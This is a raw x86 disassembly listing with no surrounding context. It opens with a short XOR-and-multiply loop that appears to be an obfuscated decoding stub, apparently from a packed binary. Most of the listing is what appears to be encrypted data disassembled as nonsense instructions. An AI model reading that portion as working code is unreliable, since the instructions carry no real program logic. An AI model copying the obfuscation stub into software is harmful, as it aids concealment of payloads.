  40cf76:	jmp    0x40cfab
  40cf7b:	mov    ecx,DWORD PTR [ebp+0x8]
  40cf7e:	mov    edx,DWORD PTR [ebp-0x8]
  40cf81:	xor    ecx,eax
  40cf83:	xor    edx,eax
  40cf85:	sub    ecx,edx
  40cf87:	sub    ecx,esi
  40cf89:	xor    ecx,eax
  40cf8b:	mov    DWORD PTR [ebp+0x8],ecx
  40cf8e:	mov    ecx,DWORD PTR [ebp+0x8]
  40cf91:	mov    edx,DWORD PTR [ebp+0x8]
  40cf94:	xor    ecx,eax
  40cf96:	imul   edx,edx,0x5708f1
  40cf9c:	add    ecx,esi
  40cf9e:	lea    ecx,[ebp+ecx*4-0x64]
  40cfa2:	mov    edi,DWORD PTR [ecx]
  40cfa4:	add    edx,edi
  40cfa6:	mov    DWORD PTR [ecx],edx
  40cfa8:	mov    ecx,DWORD PTR [ebp+0x8]
  40cfab:	xor    ecx,eax
  40cfad:	add    ecx,esi
  40cfaf:	jne    0x40cf7b
  40cfb5:	mov    ecx,DWORD PTR [ebp-0x14]
  40cfb8:	mov    edx,DWORD PTR [ebp+0x8]
  40cfbb:	xor    ecx,eax
  40cfbd:	xor    edx,eax
  40cfbf:	add    ecx,esi
  40cfc1:	add    edx,esi
  40cfc3:	cmp    ecx,edx
  40cfc5:	jae    0x40f3e3
  40cfcb:	lea    edx,[ecx-0x3272dc]
  40cfd1:	mov    DWORD PTR [ebp-0x18],edx
  40cfd4:	mov    edi,DWORD PTR [ebp-0x18]
  40cfd7:	mov    DWORD PTR [ebp-0x24],0x705fd0e
  40cfde:	lea    edx,[ebp-0x24]
  40cfe1:	mov    DWORD PTR [ebp-0x10],edx
  40cfe4:	mov    edx,DWORD PTR [ebp-0x10]
  40cfe7:	add    DWORD PTR [edx],0x705fa0e
  40cfed:	mov    ebx,DWORD PTR [ebp-0x10]
  40cff0:	xor    edi,eax
  40cff2:	add    edi,DWORD PTR [ebx]
  40cff4:	lea    edx,[ebp+ecx*4-0x64]
  40cff8:	jmp    0x40f380
  40cffd:	sar    BYTE PTR [ebx-0x74043cf0],1
  40d003:	jae    0x40cfc0
  40d005:	dec    ebp
  40d006:	bound  esi,QWORD PTR [eax-0x277f58a3]
  40d00c:	sub    al,0xb2
  40d00e:	jmp    0x5f484c8f
  40d013:	jl     0x40d091
  40d015:	add    eax,0xc806fff9
  40d01a:	je     0x40d04c
  40d01c:	std    
  40d01d:	sar    BYTE PTR ds:0xcf23bb87,0x50
  40d024:	push   edi
  40d025:	jp     0x40d074
  40d027:	jb     0x40cfaf
  40d029:	(bad)  
  40d02a:	sbb    al,0x47
  40d02c:	xor    ch,BYTE PTR [edx-0x29]
  40d02f:	cmc    
  40d030:	mov    al,ds:0x8d2268c6
  40d035:	icebp  
  40d036:	xchg   BYTE PTR [esi],dh
  40d038:	imul   edi,DWORD PTR [edx],0x37
  40d03b:	xor    eax,0xbdb8eed4
  40d040:	sbb    DWORD PTR [ecx+0x77],ecx
  40d043:	jne    0x40d048
  40d045:	out    dx,al
  40d046:	mov    bh,0xac
  40d048:	in     al,0xcd
  40d04a:	cmp    BYTE PTR cs:[edx+0x54],ah
  40d04e:	xchg   ebp,eax
  40d04f:	jns    0x40d099
  40d051:	mov    ah,dl
  40d053:	push   edi
  40d054:	sbb    BYTE PTR [esi-0x43],0xaf
  40d058:	dec    eax
  40d059:	popf   
  40d05a:	daa    
  40d05b:	mov    cl,0xe7
  40d05d:	aam    0xdc
  40d05f:	dec    edi
  40d060:	neg    ebp
  40d062:	inc    esp
  40d063:	adc    edx,DWORD PTR [ecx+0x1]
  40d066:	in     al,0x13
  40d068:	pop    ebx
  40d069:	pop    edi
  40d06a:	shl    DWORD PTR [esp+eiz*8-0x53],0x57
  40d06f:	(bad)  
  40d070:	jb     0x40d00a
  40d072:	mov    al,ds:0xc2264e1b
  40d077:	mov    ch,0xb9
  40d079:	fstp   DWORD PTR [edx+0x667ab89c]
  40d07f:	dec    esi
  40d080:	(bad)  
  40d081:	pushf  
  40d082:	test   BYTE PTR [eiz*2+0x75c7703f],dh
  40d089:	(bad)  
  40d08a:	jg     0x40d064
  40d08c:	enter  0xc2da,0x82
  40d090:	fwait
  40d091:	sub    DWORD PTR [esi+0x510e91a2],esp
  40d097:	arpl   bp,cx
  40d099:	and    eax,esi
  40d09b:	fcom   QWORD PTR [ebp+0x66]
  40d09e:	mov    ds,edi
  40d0a0:	lea    esi,[esi]
  40d0a2:	popa   
  40d0a3:	jo     0x40d0b5
  40d0a5:	shl    cl,cl
  40d0a7:	or     bh,BYTE PTR [eax+ecx*1+0x35]
  40d0ab:	mov    edx,0x5c902551
  40d0b0:	xchg   ecx,eax
  40d0b1:	sbb    BYTE PTR [ecx-0x6ddd6e8a],bh
  40d0b7:	retf   
  40d0b8:	mov    edx,0x13ab1f7f
  40d0bd:	sub    eax,0x6beffcea
  40d0c2:	retf   
  40d0c3:	mov    eax,0xf028a43d
  40d0c8:	das    
  40d0c9:	popa   
  40d0ca:	mov    ds:0x5f9aa979,eax
  40d0cf:	test   bh,al
  40d0d1:	enter  0xe658,0x37
  40d0d5:	mov    ch,0xfd
  40d0d7:	xchg   esp,eax
  40d0d8:	xchg   edi,eax
  40d0d9:	mov    ch,0x6
  40d0db:	dec    esi
  40d0dc:	lods   al,BYTE PTR ds:[esi]
  40d0dd:	and    BYTE PTR [edx],0x1c
  40d0e0:	dec    edi
  40d0e1:	push   ecx
  40d0e2:	push   edi
  40d0e3:	fwait
  40d0e4:	xor    edx,DWORD PTR [edi+0x30]
  40d0e7:	loop   0x40d0b1
  40d0e9:	inc    ebp
  40d0ea:	(bad)  
  40d0eb:	pop    ebx
  40d0ec:	dec    esi
  40d0ed:	int3   
  40d0ee:	pop    ebx
  40d0ef:	test   DWORD PTR [esi-0x2a],ecx
  40d0f2:	fbld   TBYTE PTR [edi-0x2d030d57]
  40d0f8:	call   DWORD PTR [eax+eax*1+0x3781bc99]
  40d0ff:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  40d101:	or     BYTE PTR [ebp+0x5],ch
  40d104:	push   ss
  40d105:	stos   BYTE PTR es:[edi],al
  40d106:	xchg   ebp,eax
  40d107:	jbe    0x40d0a6
  40d109:	xor    al,0x8c
  40d10b:	mov    ecx,DWORD PTR [eax]
  40d10d:	dec    edx
  40d10e:	shl    DWORD PTR [ecx-0x6f8c1d24],0xaa
  40d115:	mov    bh,dh
  40d117:	imul   ebp,DWORD PTR es:[esi],0x83d05111
  40d11e:	inc    ecx
  40d11f:	xchg   ebp,eax
  40d120:	shl    DWORD PTR ds:0xf67fb26,cl
  40d126:	lods   al,BYTE PTR ds:[esi]
  40d127:	jb     0x40d119
  40d129:	push   esi
  40d12a:	dec    ebx
  40d12b:	dec    esp
  40d12c:	into   
  40d12d:	or     eax,0xbcd603b8
  40d132:	pop    ds
  40d133:	addr16 ss cmp al,0xc0
  40d137:	mov    eax,ds:0x798a32ce
  40d13c:	jns    0x40d182
  40d13e:	cdq    
  40d13f:	and    al,0x95
  40d141:	sub    BYTE PTR [esi+0x18b3eea0],ah
  40d147:	sub    bl,BYTE PTR [edx+0x68a867ca]
  40d14d:	(bad)  
  40d14e:	mov    eax,0xfb8799b8
  40d153:	mov    ebx,gs
  40d155:	xchg   DWORD PTR [edx+0x4c],ebp
  40d158:	add    BYTE PTR [esi-0x4af34269],dl
  40d15e:	pop    edx
  40d15f:	cmp    DWORD PTR [ecx],0xb0101e9f
  40d165:	pop    esi
  40d166:	cdq    
  40d167:	sar    BYTE PTR [edx+edx*4-0xc68f5f5],cl
  40d16e:	jmp    0x85b3:0x959cd1f3
  40d175:	cld    
  40d176:	repnz loopne 0x40d144
  40d179:	lods   eax,DWORD PTR ds:[esi]
  40d17a:	push   edi
  40d17b:	in     al,dx
  40d17c:	xchg   ecx,eax
  40d17d:	mov    cl,0xa8
  40d17f:	cs xchg esi,eax
  40d181:	or     ebx,ecx
  40d183:	pop    ebp
  40d184:	push   ds
  40d185:	(bad)  
  40d186:	repz leave 
  40d188:	cmp    dl,BYTE PTR ds:0xe95fbc4f
  40d18e:	repz jmp 0xf16b:0x6febdf6b
  40d196:	dec    DWORD PTR [esi-0x32]
  40d199:	pop    ecx
  40d19a:	icebp  
  40d19b:	imul   ebx,DWORD PTR [edx+ebx*1-0x41a7e303],0x16731766
  40d1a6:	and    DWORD PTR [edx-0x62113a53],0x6a0a1fc3
  40d1b0:	scas   eax,DWORD PTR es:[edi]
  40d1b1:	xor    al,0x42
  40d1b3:	jns    0x40d1da
  40d1b5:	mov    ah,0x9e
  40d1b7:	mov    ecx,0xd42fc6f4
  40d1bc:	retf   0x3e73
  40d1bf:	lods   al,BYTE PTR ds:[esi]
  40d1c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d1c1:	retf   0x344f
  40d1c4:	iret   
  40d1c5:	mov    ah,cl
  40d1c7:	fadd   DWORD PTR [eax+edi*8+0x1e]
  40d1cb:	test   eax,0xc3e5a50
  40d1d0:	aaa    
  40d1d1:	test   BYTE PTR [edi],bh
  40d1d3:	daa    
  40d1d4:	ins    DWORD PTR es:[edi],dx
  40d1d5:	rcl    BYTE PTR [ecx+0x71f25d4a],cl
  40d1db:	into   
  40d1dc:	test   DWORD PTR [edi-0x3dbde91],0xdc8bd6fb
  40d1e6:	call   0x64e0:0x21a597a
  40d1ed:	es push edi
  40d1ef:	mov    edx,0x2681981
  40d1f4:	lods   al,BYTE PTR ds:[esi]
  40d1f5:	push   ebx
  40d1f6:	not    BYTE PTR [ebx]
  40d1f8:	sub    dl,al
  40d1fa:	jne    0x40d18c
  40d1fc:	push   ebp
  40d1fd:	sbb    BYTE PTR [esi-0x2fa53a2c],cl
  40d203:	add    BYTE PTR [edx],0xcc
  40d206:	pop    ds
  40d207:	(bad)  
  40d208:	pop    edi
  40d209:	loopne 0x40d257
  40d20b:	adc    BYTE PTR [eax+ecx*2-0x3cdae14b],dl
  40d212:	outs   dx,BYTE PTR ds:[esi]
  40d213:	out    0xad,eax
  40d215:	stos   DWORD PTR es:[edi],eax
  40d216:	ret    0x86e3
  40d219:	lea    edi,[ecx+0x1e]
  40d21c:	cmp    ah,al
  40d21e:	(bad)  
  40d21f:	push   ecx
  40d220:	es pop ss
  40d222:	out    0x2c,al
  40d224:	leave  
  40d225:	retf   
  40d226:	add    DWORD PTR [eax],0x22f90c8d
  40d22c:	xor    eax,0xb8c9148e
  40d231:	cmp    dh,dh
  40d233:	push   es
  40d234:	fdivr  st(6),st
  40d236:	mov    esi,0xccd5807e
  40d23b:	mov    ah,0x32
  40d23d:	ret    
  40d23e:	mov    eax,0x3a5deaaa
  40d243:	shl    DWORD PTR [ebx+0x6a],cl
  40d246:	in     eax,dx
  40d247:	(bad)  
  40d248:	pop    ecx
  40d249:	je     0x40d1f4
  40d24b:	push   0x8d95a05a
  40d250:	mov    dh,0x26
  40d252:	cmp    dl,BYTE PTR [ecx+0x7]
  40d255:	mov    ds:0x7654b0f2,al
  40d25a:	cmp    eax,0x9b91db84
  40d25f:	js     0x40d1ef
  40d261:	mov    ebp,0x1415fd7c
  40d266:	and    BYTE PTR [si],dl
  40d269:	dec    ebp
  40d26a:	lods   al,BYTE PTR ds:[esi]
  40d26b:	(bad)  
  40d26c:	sbb    DWORD PTR [esi],esi
  40d26e:	jno    0x40d23f
  40d270:	ins    BYTE PTR es:[edi],dx
  40d271:	(bad)  
  40d272:	pop    esi
  40d273:	lods   al,BYTE PTR ds:[esi]
  40d274:	mov    DWORD PTR [eax-0x1a8a4670],edi
  40d27a:	data16 jne 0x40d207
  40d27d:	add    al,0x13
  40d27f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d280:	mov    eax,0x46c13fa5
  40d285:	mov    dl,0xfe
  40d287:	loop   0x40d2d7
  40d289:	xor    al,0xfa
  40d28b:	push   0xffffffc1
  40d28d:	pop    eax
  40d28e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d28f:	dec    ecx
  40d290:	aam    0x44
  40d292:	in     al,dx
  40d293:	pop    esi
  40d294:	int3   
  40d295:	retf   
  40d296:	es daa 
  40d298:	jg     0x40d319
  40d29a:	shl    DWORD PTR ds:0xb26822a8,0x71
  40d2a1:	leave  
  40d2a2:	ss dec esi
  40d2a4:	jae    0x40d30e
  40d2a6:	call   0xca5c:0x1e456015
  40d2ad:	jae    0x40d268
  40d2af:	add    al,0x7
  40d2b1:	dec    ecx
  40d2b2:	inc    eax
  40d2b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d2b4:	dec    edx
  40d2b5:	xor    al,0x95
  40d2b7:	mov    esi,0x49f25ba8
  40d2bc:	jle    0x40d284
  40d2be:	pusha  
  40d2bf:	jge    0x40d332
  40d2c1:	jo     0x40d2e3
  40d2c3:	les    ebx,FWORD PTR [edi-0x68b2a3b1]
  40d2c9:	fcomp  DWORD PTR ds:0xc4486533
  40d2cf:	cmp    edx,DWORD PTR [edx]
  40d2d1:	lahf   
  40d2d2:	adc    BYTE PTR [edx-0x27],bl
  40d2d5:	jmp    0xf3f72793
  40d2da:	xchg   esi,eax
  40d2db:	test   al,0x26
  40d2dd:	ficom  WORD PTR [edx+0x5]
  40d2e0:	jns    0x40d313
  40d2e2:	lods   al,BYTE PTR ds:[esi]
  40d2e3:	pop    ebx
  40d2e4:	(bad)
  40d2e7:	mov    dh,0xfc
  40d2e9:	jge    0x40d29a
  40d2eb:	rcl    BYTE PTR [edi],0x7b
  40d2ee:	mov    dl,0x49
  40d2f0:	mov    ch,0x94
  40d2f2:	sbb    edi,DWORD PTR [edx]
  40d2f4:	mov    eax,ds:0x46183390
  40d2f9:	xor    bl,BYTE PTR [ecx-0x43]
  40d2fc:	retf   0x8b6e
  40d2ff:	jo     0x40d351
  40d301:	les    ecx,FWORD PTR [esi-0x5eeeb76]
  40d307:	jb     0x40d2b4
  40d309:	push   cs
  40d30a:	not    ebx
  40d30c:	sub    edi,edx
  40d30e:	push   ebp
  40d30f:	lea    ebx,[edi+0x26]
  40d312:	mov    fs,ebx
  40d314:	aaa    
  40d315:	adc    DWORD PTR [ebp+0x2e],ebp
  40d318:	push   edi
  40d319:	loop   0x40d352
  40d31b:	xor    ch,BYTE PTR [edx*4+0x2df35fcb]
  40d322:	nop
  40d323:	pop    edx
  40d324:	pushf  
  40d325:	xchg   ecx,eax
  40d326:	rcr    ah,cl
  40d328:	sbb    esi,DWORD PTR [ecx-0x51]
  40d32b:	fimul  DWORD PTR [edi+0x7876bf4]
  40d331:	clc    
  40d332:	fisttp DWORD PTR [edi-0x21106e5f]
  40d338:	push   0xffffff95
  40d33a:	and    BYTE PTR [ebx+0x2457c0b9],ah
  40d340:	ins    DWORD PTR es:[edi],dx
  40d341:	call   0x799b9aa4
  40d346:	add    al,0x1f
  40d348:	in     al,0xa3
  40d34a:	dec    ebp
  40d34b:	pusha  
  40d34c:	ds cmovs eax,ecx
  40d350:	scas   eax,DWORD PTR es:[edi]
  40d351:	ss or  eax,0x60408521
  40d357:	popa   
  40d358:	or     ch,bl
  40d35a:	add    edx,esi
  40d35c:	mov    ds:0x1a171f37,eax
  40d361:	addr16 inc edx
  40d363:	out    dx,al
  40d364:	ret    0x8448
  40d367:	imul   ebx,DWORD PTR [ebx-0x3247433b],0x221fa289
  40d371:	shr    DWORD PTR [eax],1
  40d373:	xor    BYTE PTR [edi-0x35ceae1],0xb4
  40d37a:	por    mm1,QWORD PTR [edx+0x42]
  40d37e:	dec    ebp
  40d37f:	or     BYTE PTR [edi+0x1b8cf4c8],dl
  40d385:	ret    
  40d386:	and    ecx,ecx
  40d388:	mov    WORD PTR ds:0x60e0b4ac,gs
  40d38e:	xchg   ebx,eax
  40d38f:	inc    ecx
  40d390:	push   edx
  40d391:	mov    eax,ds:0x19b80ab8
  40d396:	jle    0x40d3f3
  40d398:	and    ecx,DWORD PTR [esi]
  40d39a:	mov    esp,ebx
  40d39c:	push   esi
  40d39d:	test   eax,0xddb8cd88
  40d3a2:	push   edi
  40d3a3:	pop    esi
  40d3a4:	sbb    esi,ebp
  40d3a6:	aam    0x3e
  40d3a8:	xor    edi,edi
  40d3aa:	int    0x4e
  40d3ac:	imul   ebx,ebp,0xffffff8f
  40d3af:	add    bl,dh
  40d3b1:	addr16 test edx,ebx
  40d3b4:	push   ebp
  40d3b5:	push   0x10b76588
  40d3ba:	es xchg ebp,eax
  40d3bc:	pop    esi
  40d3bd:	or     eax,edx
  40d3bf:	daa    
  40d3c0:	jne    0x40d40d
  40d3c2:	adc    ch,BYTE PTR [edi]
  40d3c4:	js     0x40d396
  40d3c6:	enter  0x389b,0x2a
  40d3ca:	dec    ecx
  40d3cb:	inc    esi
  40d3cc:	pop    ebx
  40d3cd:	popf   
  40d3ce:	in     al,dx
  40d3cf:	shl    ebp,0xdd
  40d3d2:	js     0x40d3e6
  40d3d4:	call   0xac78:0xb91fdc21
  40d3db:	cli    
  40d3dc:	fisttp QWORD PTR ds:0x5c3c4052
  40d3e2:	les    ebx,FWORD PTR [esi]
  40d3e4:	and    dh,BYTE PTR [eax-0x30]
  40d3e7:	mov    cl,0xf9
  40d3e9:	and    eax,0xb26ad234
  40d3ee:	add    DWORD PTR [edi],eax
  40d3f0:	push   ecx
  40d3f1:	inc    ebx
  40d3f2:	and    BYTE PTR cs:[ebx-0x2907a734],ah
  40d3f9:	mov    edx,DWORD PTR [esi]
  40d3fb:	push   0xe64fe2f1
  40d400:	pop    esi
  40d401:	adc    al,0x3a
  40d403:	cld    
  40d404:	lods   al,BYTE PTR ds:[esi]
  40d405:	adc    al,0xde
  40d407:	mov    edx,0x3fd7b252
  40d40c:	sub    esi,DWORD PTR [edi+0x5b]
  40d40f:	add    BYTE PTR [ebp+0x42],0x64
  40d413:	push   eax
  40d414:	call   0x4dee:0x72825a47
  40d41b:	aaa    
  40d41c:	xor    edi,DWORD PTR [edx]
  40d41e:	adc    ch,bh
  40d420:	pop    es
  40d421:	xor    al,BYTE PTR [ebx+0x6126f719]
  40d427:	mov    ds:0xc7f7850b,al
  40d42c:	mov    bh,cl
  40d42e:	pop    ebx
  40d42f:	xchg   ebp,eax
  40d430:	add    eax,0x97ac3ec5
  40d435:	loope  0x40d4b5
  40d437:	fwait
  40d438:	add    DWORD PTR [esp+eax*4+0x6ba921ac],0x794d8200
  40d443:	or     edx,edx
  40d445:	push   esi
  40d446:	xor    DWORD PTR [edi],esp
  40d448:	jge    0x40d489
  40d44a:	dec    esi
  40d44b:	push   eax
  40d44c:	mov    edx,0x89ed44d2
  40d451:	mov    eax,DWORD PTR [ebx+0x28]
  40d454:	jmp    0xf5a7:0x3b9a33a7
  40d45b:	stos   DWORD PTR es:[edi],eax
  40d45c:	mov    ebx,0xdab37634
  40d461:	mov    ebx,0x641222df
  40d466:	cmp    eax,0x1e15f85e
  40d46b:	(bad)  
  40d46d:	inc    eax
  40d46e:	fucomi st,st(0)
  40d470:	inc    esi
  40d471:	mov    esp,0x502ae21c
  40d476:	(bad)  
  40d478:	inc    ecx
  40d479:	fistp  WORD PTR [eax-0x71e05a5f]
  40d47f:	int3   
  40d480:	cdq    
  40d481:	or     ebp,esp
  40d483:	jge    0x40d42f
  40d485:	sub    esp,DWORD PTR [eax+0x3c]
  40d488:	inc    BYTE PTR [esi+0x74]
  40d48b:	mov    dl,0xed
  40d48d:	aas    
  40d48e:	(bad)  
  40d490:	retf   
  40d491:	sahf   
  40d492:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d493:	ss fwait
  40d495:	sahf   
  40d496:	loope  0x40d4bf
  40d498:	aaa    
  40d499:	jo     0x40d42a
  40d49b:	xor    al,0x22
  40d49d:	fwait
  40d49e:	push   eax
  40d49f:	adc    BYTE PTR ds:0x55bdfb42,bl
  40d4a5:	adc    eax,0xc06e193a
  40d4aa:	jb     0x40d4aa
  40d4ac:	dec    ecx
  40d4ad:	nop
  40d4ae:	and    al,0x49
  40d4b0:	mov    eax,ds:0xbc6082ff
  40d4b5:	retf   0x5fdd
  40d4b8:	(bad)  
  40d4b9:	adc    eax,0x8ef8f8fb
  40d4be:	sub    ecx,ebx
  40d4c0:	dec    ebp
  40d4c1:	setnp  BYTE PTR [eax]
  40d4c4:	push   es
  40d4c5:	call   0x937eb7ae
  40d4ca:	pop    es
  40d4cb:	cmc    
  40d4cc:	fcmove st,st(5)
  40d4ce:	pushf  
  40d4cf:	cmc    
  40d4d0:	and    eax,DWORD PTR [eax-0x503eb952]
  40d4d6:	bound  ebx,QWORD PTR [ecx+0xa49ca57]
  40d4dc:	out    0x3,eax
  40d4de:	sahf   
  40d4df:	xchg   edi,eax
  40d4e0:	in     eax,0x87
  40d4e2:	stc    
  40d4e3:	and    al,0xc2
  40d4e5:	dec    esp
  40d4e6:	xor    al,0x76
  40d4e8:	push   ecx
  40d4e9:	and    esp,DWORD PTR [esp+ecx*2-0x47]
  40d4ed:	in     eax,dx
  40d4ee:	push   ss
  40d4ef:	jns    0x40d531
  40d4f1:	jl     0x40d4cf
  40d4f3:	aad    0x46
  40d4f5:	sbb    eax,0xc5483a91
  40d4fb:	out    dx,eax
  40d4fc:	mov    ebx,DWORD PTR ds:[esi+0x56]
  40d500:	pushf  
  40d501:	cs inc edi
  40d503:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d504:	push   ebp
  40d505:	pop    ds
  40d506:	lods   eax,DWORD PTR ds:[esi]
  40d507:	pushf  
  40d508:	xor    eax,0x2e76e3f0
  40d50d:	shl    BYTE PTR [ebp+0x18799c81],0x52
  40d514:	dec    ebx
  40d515:	push   ebp
  40d516:	xchg   BYTE PTR [eax-0x40d1c424],ah
  40d51c:	pusha  
  40d51d:	mov    dh,0x11
  40d51f:	fiadd  WORD PTR [edi+eiz*1+0x1db854fc]
  40d526:	int3   
  40d527:	sbb    cl,ah
  40d529:	jae    0x40d570
  40d52b:	adc    ebx,DWORD PTR [edi+0x39]
  40d52e:	mov    ds:0x212a83a3,eax
  40d533:	adc    esi,DWORD PTR [ebx-0x6a964dda]
  40d539:	and    cl,bl
  40d53b:	stos   DWORD PTR es:[edi],eax
  40d53c:	push   cs
  40d53d:	mov    dh,0x51
  40d53f:	pop    esp
  40d540:	rcl    DWORD PTR [ebx+esi*1-0xa806573],cl
  40d547:	call   0x9c74b2d
  40d54c:	xor    ch,BYTE PTR [edi+0x78f04fa3]
  40d552:	dec    ecx
  40d553:	sub    eax,0x750b37f6
  40d558:	bnd jb 0x40d54e
  40d55b:	ret    
  40d55c:	add    al,0xae
  40d55e:	cld    
  40d55f:	imul   cx,WORD PTR [eax+0x7149f52c],0xe999
  40d568:	pop    es
  40d569:	mov    eax,ds:0xefaf86a3
  40d56e:	adc    eax,0x20e3f42e
  40d573:	loop   0x40d5a3
  40d575:	dec    esp
  40d576:	pop    ds
  40d577:	inc    ebp
  40d578:	retf   
  40d579:	or     BYTE PTR [esi+edx*4+0x8],ch
  40d57d:	stc    
  40d57e:	jge    0x40d5db
  40d580:	imul   ebp,DWORD PTR [edi+0x3],0x1f0736ed
  40d587:	stc    
  40d588:	stc    
  40d589:	ds lock out 0xa,eax
  40d58d:	dec    ebp
  40d58e:	adc    al,0x37
  40d590:	ret    
  40d591:	lods   eax,DWORD PTR ds:[esi]
  40d592:	xor    edi,esi
  40d594:	push   0x4f91d90c
  40d599:	xchg   ecx,eax
  40d59a:	fcom   QWORD PTR [esi+ecx*2-0x6c]
  40d59e:	mov    ds:0x76372ae1,eax
  40d5a3:	mov    dh,0x18
  40d5a5:	not    DWORD PTR [edi-0x41]
  40d5a8:	inc    esp
  40d5a9:	fadd   DWORD PTR [eax-0x55389720]
  40d5af:	nop
  40d5b0:	pop    ecx
  40d5b1:	inc    ebx
  40d5b2:	stos   DWORD PTR es:[edi],eax
  40d5b3:	pop    ds
  40d5b4:	retf   0x3b5d
  40d5b7:	sti    
  40d5b8:	aas    
  40d5b9:	push   edi
  40d5ba:	mov    ds:0xb3e24232,al
  40d5bf:	pandn  mm3,QWORD PTR [edi+0x4e21ac1e]
  40d5c6:	aad    0x6
  40d5c8:	lds    edx,FWORD PTR [ebx+0x55]
  40d5cb:	jns    0x40d5c6
  40d5cd:	pop    ecx
  40d5ce:	add    eax,0x63b08b8f
  40d5d3:	jmp    0xf46e:0xfe7ead19
  40d5da:	dec    edi
  40d5db:	cwde   
  40d5dc:	mov    ebp,0x1118fca6
  40d5e1:	adc    ch,BYTE PTR [ebx+0xe]
  40d5e4:	lods   eax,DWORD PTR ds:[esi]
  40d5e5:	jg     0x40d658
  40d5e7:	out    0xef,al
  40d5e9:	aaa    
  40d5ea:	scas   eax,DWORD PTR es:[edi]
  40d5eb:	fcmovne st,st(1)
  40d5ed:	xchg   ebx,eax
  40d5ee:	or     eax,0xcbeb7f50
  40d5f3:	arpl   di,dx
  40d5f5:	sub    BYTE PTR [ebp+0x479c865c],dh
  40d5fb:	mov    edi,0x18b96c
  40d600:	xchg   BYTE PTR ds:0xb4b96529,bh
  40d606:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d607:	add    ah,al
  40d609:	pop    esp
  40d60a:	mov    al,ds:0xf8547ce7
  40d60f:	ins    BYTE PTR es:[edi],dx
  40d610:	(bad)  
  40d611:	xor    al,0xb5
  40d613:	(bad)  
  40d614:	ins    DWORD PTR es:[edi],dx
  40d615:	out    0x54,al
  40d617:	jo     0x40d626
  40d619:	mov    eax,edi
  40d61b:	les    eax,FWORD PTR [ebx+0x4c5c89b0]
  40d621:	repz mov cl,0x1b
  40d624:	rcr    BYTE PTR [eax],0xdc
  40d627:	retw   
  40d629:	mov    ebx,0xbde88a67
  40d62e:	jl     0x40d604
  40d630:	lods   al,BYTE PTR ds:[esi]
  40d631:	shl    BYTE PTR [ebx+0x33],cl
  40d634:	(bad)  
  40d635:	fist   DWORD PTR [esp+edi*8]
  40d638:	xor    eax,0x7cfe2864
  40d63d:	scas   al,BYTE PTR es:[edi]
  40d63e:	mov    ds:0x1e6b9088,al
  40d643:	lea    eax,[eax-0x1d]
  40d646:	outs   dx,BYTE PTR ds:[esi]
  40d647:	inc    ecx
  40d648:	sbb    edx,ebx
  40d64a:	push   eax
  40d64b:	repnz popa 
  40d64d:	dec    ecx
  40d64e:	mov    cl,0x8f
  40d651:	inc    ebp
  40d652:	push   cs
  40d653:	mov    edx,0xe637571
  40d658:	inc    esp
  40d659:	mov    al,ds:0x5af05250
  40d65e:	or     eax,0x50aabbff
  40d663:	sbb    eax,0x51036047
  40d668:	jno    0x40d69d
  40d66a:	imul   edi,DWORD PTR [ebx],0x2a
  40d66d:	pop    esi
  40d66e:	in     eax,dx
  40d66f:	sub    ecx,DWORD PTR [ecx+esi*1+0x42af842d]
  40d676:	xchg   BYTE PTR [edi],ah
  40d678:	test   DWORD PTR [eax-0x3],edi
  40d67b:	cmc    
  40d67c:	shl    DWORD PTR [ebx+esi*1-0x68],cl
  40d680:	or     BYTE PTR [esi-0x7e],bh
  40d683:	popa   
  40d684:	lahf   
  40d685:	imul   edx,DWORD PTR [ebp-0x1f],0xd544c7b6
  40d68c:	mov    cl,0x5c
  40d68e:	in     al,dx
  40d68f:	repnz arpl WORD PTR [eax],bx
  40d692:	and    BYTE PTR ss:[esi-0x30],dh
  40d696:	pop    ds
  40d697:	shr    BYTE PTR [edi+0x4585f8d3],0xc2
  40d69e:	adc    dl,bh
  40d6a0:	adc    eax,0x21ccbd91
  40d6a5:	fst    QWORD PTR [eax]
  40d6a7:	cmp    eax,edi
  40d6a9:	imul   edx,DWORD PTR [ecx-0x7e],0xffffffb0
  40d6ad:	sbb    BYTE PTR [esi+0x5a621244],bh
  40d6b3:	shr    ecx,1
  40d6b5:	xchg   ebp,eax
  40d6b6:	add    DWORD PTR [edx],0x40aeb38b
  40d6bc:	cmp    BYTE PTR [eax+0x3c],bl
  40d6bf:	xor    al,0xd2
  40d6c1:	xchg   ebx,eax
  40d6c2:	sub    eax,0xaaed1e81
  40d6c7:	add    edx,DWORD PTR [esi]
  40d6c9:	lea    ecx,ss:[esi-0x5d]
  40d6cd:	jecxz  0x40d704
  40d6cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d6d0:	jmp    0x5129:0x1c61bf3b
  40d6d7:	mov    dh,BYTE PTR [edi]
  40d6d9:	das    
  40d6da:	sar    BYTE PTR [ecx+ebp*2-0x3b],cl
  40d6de:	mov    dl,0x96
  40d6e0:	(bad)  
  40d6e1:	pusha  
  40d6e2:	fucomi st,st(2)
  40d6e4:	daa    
  40d6e5:	(bad)  
  40d6e6:	out    dx,al
  40d6e7:	mov    al,ds:0xbd10a238
  40d6ec:	xchg   ebx,eax
  40d6ed:	mov    edi,0x3a501297
  40d6f2:	sbb    edx,eax
  40d6f4:	mov    bh,0x26
  40d6f6:	xor    esi,esi
  40d6f8:	into   
  40d6f9:	leave  
  40d6fa:	or     esi,DWORD PTR [esi-0x4ca2d875]
  40d700:	mov    bh,0xcb
  40d702:	sbb    cl,BYTE PTR [esi]
  40d704:	inc    eax
  40d705:	jae    0x40d738
  40d707:	sti    
  40d708:	add    eax,0x1deccc12
  40d70d:	push   ds
  40d70e:	das    
  40d70f:	std    
  40d710:	mov    al,ds:0x345193ac
  40d715:	xor    cl,bh
  40d717:	and    ah,BYTE PTR [ebx-0x27]
  40d71a:	pop    ss
  40d71b:	lds    edi,FWORD PTR [ebx-0x5e]
  40d71e:	adc    eax,0xf1286b6c
  40d723:	pop    esi
  40d724:	jb     0x40d735
  40d726:	fist   WORD PTR [ebx-0x54]
  40d729:	cwde   
  40d72a:	in     eax,0xd7
  40d72c:	aam    0x25
  40d72e:	in     eax,0x22
  40d730:	dec    edx
  40d731:	das    
